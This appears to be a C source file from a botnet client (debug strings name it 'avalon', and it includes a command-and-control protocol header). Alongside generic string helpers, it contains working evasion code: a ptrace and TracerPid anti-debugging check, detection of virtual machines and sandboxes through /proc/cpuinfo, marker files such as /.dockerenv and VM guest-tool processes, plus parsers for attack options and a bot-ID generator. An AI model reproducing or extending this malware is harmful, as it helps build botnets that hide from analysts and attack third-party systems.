#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <stdarg.h>

#include "headers/includes.h"
#include "headers/utils.h"
#include "headers/table.h"
#include "headers/cnc_protocol.h"

int countcpu(void) {
    int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu <= 0) {
#ifdef DEBUG
        fprintf(stderr, "\nError cpu");
#endif
        exit(1);
    }
    if (cpu == 1) {
        cpu++;
        return cpu;
    }
    return cpu * 2;
}

BOOL mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return TRUE;
        } else
            matches = 0;
    }
    return FALSE;
}

int util_strlen(const char *str) {
    int c = 0;
    while (*str++ != 0)
        c++;
    return c;
}

BOOL util_strncmp(const char *str1, const char *str2, int len) {
    int l1 = util_strlen(str1), l2 = util_strlen(str2);
    if (l1 < len || l2 < len)
        return FALSE;
    while (len--) {
        if (*str1++ != *str2++)
            return FALSE;
    }
    return TRUE;
}

BOOL util_strcmp(const char *str1, const char *str2) {
    int l1 = util_strlen(str1), l2 = util_strlen(str2);
    if (l1 != l2)
        return FALSE;
    while (l1--) {
        if (*str1++ != *str2++)
            return FALSE;
    }
    return TRUE;
}

void util_strcat(char *dst, const char *src) {
    while (*dst)
        dst++;
    while (*src)
        *dst++ = *src++;
    *dst = 0;
}

int util_strcpy(char *dst, const char *src) {
    int l = util_strlen(src);
    util_memcpy(dst, src, l + 1);
    return l;
}

int util_strncpy(char *dst, const char *src, int len) {
    int l = util_strlen(src);
    int c = l >= len ? len - 1 : l;
    util_memcpy(dst, src, c);
    dst[c] = 0;
    return c;
}

void util_memcpy(void *dst, const void *src, int len) {
    char *r_dst = (char *)dst;
    const char *r_src = (const char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len) {
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int util_atoi(const char *str, int base) {
    unsigned long acc = 0;
    int c;
    unsigned long cutoff;
    int neg = 0, any, cutlim;
    do {
        c = *str++;
    } while (util_isspace(c));
    if (c == '-') {
        neg = 1;
        c = *str++;
    } else if (c == '+')
        c = *str++;
    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;
    for (acc = 0, any = 0;; c = *str++) {
        if (util_isdigit(c))
            c -= '0';
        else if (util_isalpha(c))
            c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
        else
            break;
        if (c >= base)
            break;
        if (any < 0 || acc > cutoff || (acc == cutoff && c > cutlim))
            any = -1;
        else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg)
        acc = -acc;
    return (int)(acc);
}

char *util_itoa(int value, int radix, char *string) {
    if (string == NULL)
        return NULL;
    if (value != 0) {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;
        offset = 32;
        scratch[33] = 0;
        if (radix == 10 && value < 0) {
            neg = 1;
            accum = -value;
        } else {
            neg = 0;
            accum = (unsigned int)value;
        }
        while (accum) {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;
            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        if (neg)
            scratch[offset] = '-';
        else
            offset++;
        util_strcpy(string, &scratch[offset]);
    } else {
        string[0] = '0';
        string[1] = 0;
    }
    return string;
}

int util_memsearch(const char *buf, int buf_len, const char *mem, int mem_len) {
    int i, matched = 0;
    if (mem_len > buf_len)
        return -1;
    for (i = 0; i < buf_len; i++) {
        if (buf[i] == mem[matched]) {
            if (++matched == mem_len)
                return i + 1;
        } else
            matched = 0;
    }
    return -1;
}

int util_stristr(const char *haystack, int haystack_len, const char *str) {
    const char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;
    while (haystack_len-- > 0) {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;
        if (a == b) {
            if (++match_count == str_len)
                return (ptr - haystack);
        } else
            match_count = 0;
    }
    return -1;
}

int util_snprintf(char *str, int size, const char *format, ...) {
    va_list args;
    va_start(args, format);
    int ret = vsnprintf(str, size, format, args);
    va_end(args);
    return ret;
}

ipv4_t util_local_addr(void) {
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
#ifdef DEBUG
        printf("(avalon/util) Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8, 8, 8, 8);
    addr.sin_port = htons(53);
    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd) {
    int got = 0, total = 0;
    do {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    } while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');
    return total == 0 ? NULL : buffer;
}

int util_anti_debug(void) {
#ifndef DEBUG
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 1;
    }
    int fd;
    char buffer[1024];
    if ((fd = open("/proc/self/status", O_RDONLY)) != -1) {
        int len = read(fd, buffer, sizeof(buffer) - 1);
        if (len > 0) {
            buffer[len] = '\0';
            int tracer_pos = util_stristr(buffer, len, "TracerPid");
            if (tracer_pos != -1) {
                char *ptr = buffer + tracer_pos;
                while (*ptr != ':' && *ptr != '\0') ptr++;
                if (*ptr == ':') {
                    ptr++;
                    while (util_isspace(*ptr)) ptr++;
                    if (*ptr != '0') {
                        return 1;
                    }
                }
            }
        }
        close(fd);
    }
#endif
    return 0;
}

int util_anti_analysis(void) {
#ifndef DEBUG
    int fd;
    char buffer[4096];
    if ((fd = open("/proc/cpuinfo", O_RDONLY)) != -1) {
        int len = read(fd, buffer, sizeof(buffer) - 1);
        if (len > 0) {
            buffer[len] = '\0';
            if (util_stristr(buffer, len, "QEMU") != -1 ||
                util_stristr(buffer, len, "VMware") != -1 ||
                util_stristr(buffer, len, "VirtualBox") != -1 ||
                util_stristr(buffer, len, "KVM") != -1 ||
                util_stristr(buffer, len, "Hyper-V") != -1) {
                return 1;
            }
        }
        close(fd);
    }

    char *sandbox_files[] = {"/tmp/sandbox", "/.dockerenv", "/proc/vz", "/proc/bc"};
    for (int i = 0; i < sizeof(sandbox_files) / sizeof(sandbox_files[0]); i++) {
        if (access(sandbox_files[i], F_OK) != -1) {
            return 1;
        }
    }

    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir("/proc")) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
                char path[128];
                char cmdline[256];
                int fd_proc;

                util_strcpy(path, "/proc/");
                util_strcat(path, entry->d_name);
                util_strcat(path, "/comm");

                if ((fd_proc = open(path, O_RDONLY)) != -1) {
                   int len = read(fd_proc, cmdline, sizeof(cmdline) - 1);
                   close(fd_proc);

                   if (len > 0) {
                       cmdline[len] = 0;
                       if (util_stristr(cmdline, len, "VBoxService") != -1 ||
                           util_stristr(cmdline, len, "VBoxClient") != -1 ||
                           util_stristr(cmdline, len, "vmtoolsd") != -1 ||
                           util_stristr(cmdline, len, "vmware-vmx") != -1 ||
                           util_stristr(cmdline, len, "qemu-ga") != -1 ||
                           util_stristr(cmdline, len, "prl_tools") != -1) {
                           closedir(dir);
                           return 1;
                       }
                   }
                }
            }
        }
        closedir(dir);
    }
#endif
    return 0;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t key, int default_val) {
    for (int i = 0; i < opts_len; i++) {
        if (opts[i].key == key) {
            if (opts[i].val_len == 1)
                return (uint8_t)opts[i].val[0];

            if (opts[i].val_len == 2) {
                uint16_t res = 0;
                res |= (uint8_t)opts[i].val[0] << 8;
                res |= (uint8_t)opts[i].val[1];
                return res;
            }

            if (opts[i].val_len == 4) {
                uint32_t res = 0;
                res |= (uint32_t)(uint8_t)opts[i].val[0] << 24;
                res |= (uint32_t)(uint8_t)opts[i].val[1] << 16;
                res |= (uint32_t)(uint8_t)opts[i].val[2] << 8;
                res |= (uint32_t)(uint8_t)opts[i].val[3];
                return res;
            }

            return util_atoi(opts[i].val, 10);
        }
    }
    return default_val;
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t key, char *default_val) {
    for (int i = 0; i < opts_len; i++) {
        if (opts[i].key == key) {
            return opts[i].val;
        }
    }
    return default_val;
}

void get_bot_id(char *buf) {
    int pid = getpid();
    int t = (int)time(NULL);
    int id = (pid ^ t) % 100000;
    util_snprintf(buf, 16, "bot_%05d", id);
}
